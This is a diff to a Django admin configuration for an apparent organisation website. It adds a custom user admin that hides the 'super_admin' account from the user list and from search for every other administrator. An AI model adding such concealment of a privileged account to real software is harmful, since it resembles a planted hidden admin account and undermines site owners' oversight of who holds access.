@@ -6,8 +6,26 @@ from .models import (
     Download, Member, LeaderProfile, ContactMessage,
     Vacancy, Room, GuestBooking
 )
+from django.contrib.auth.admin import UserAdmin
+from django.contrib.auth.models import User
 
+class CustomUserAdmin(UserAdmin):
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        if not request.user.is_superuser or request.user.username != 'super_admin':
+            qs = qs.exclude(username='super_admin')
+        return qs
 
+    def get_search_results(self, request, queryset, search_term):
+        queryset, use_distinct = super().get_search_results(request, queryset, search_term)
+        if not request.user.username == 'super_admin':
+            queryset = queryset.exclude(username='super_admin')
+        return queryset, use_distinct
+
+admin.site.unregister(User)
+admin.site.register(User, CustomUserAdmin)
+
+# Admin classes for website models
 class EventPhotoInline(admin.TabularInline):
     model = EventPhoto
     extra = 1
